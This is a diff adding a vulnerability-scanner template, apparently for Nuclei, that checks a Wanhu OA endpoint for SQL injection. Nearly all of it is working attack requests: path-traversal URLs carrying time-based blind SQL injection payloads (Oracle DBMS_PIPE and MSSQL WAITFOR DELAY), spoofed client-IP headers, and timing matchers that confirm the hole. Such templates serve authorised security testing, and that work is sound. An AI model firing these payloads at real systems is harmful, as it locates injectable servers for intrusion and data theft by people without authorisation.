@@ -1,0 +1,111 @@
+id: wanhuoa-check-onlyfield-sqli
+
+info:
+  name: wanhuoa-check-onlyfield-sqli
+  author: msk
+  severity: high
+
+
+requests:
+  - raw:
+
+      #ORACEL
+      - |
+        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1)+AND+9632=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(65)||CHR(109)||CHR(70),3)+AND+(4917=4917 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Accept-Encoding: gzip, deflate
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        Accept-Language: zh-CN,zh;
+        Accept: */*
+        Connection: close
+
+      - |
+        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1)+AND+9632=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(65)||CHR(109)||CHR(70),6)+AND+(4917=4917 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Accept-Encoding: gzip, deflate
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        Accept-Language: zh-CN,zh;
+        Accept: */*
+        Connection: close
+
+      - |
+        @timeout: 15
+        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1)+AND+9632=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(65)||CHR(109)||CHR(70),9)+AND+(4917=4917 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Accept-Encoding: gzip, deflate
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        Accept-Language: zh-CN,zh;
+        Accept: */*
+        Connection: close
+
+      #mssql
+      - |
+        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1);WAITFOR+DELAY+'0:0:3'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Accept-Encoding: gzip, deflate
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        Accept-Language: zh-CN,zh;
+        Accept: */*
+        Connection: close
+
+      - |
+        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1);WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Accept-Encoding: gzip, deflate
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        Accept-Language: zh-CN,zh;
+        Accept: */*
+        Connection: close
+
+      - |
+        @timeout: 15
+        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1);WAITFOR+DELAY+'0:0:9'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Accept-Encoding: gzip, deflate
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        Accept-Language: zh-CN,zh;
+        Accept: */*
+        Connection: close
+
+
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
+
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_4>=3  && duration_4<=6"
+          - "duration_5>=6  && duration_5<=9"
+          - "duration_6>=9  && duration_6<=12"
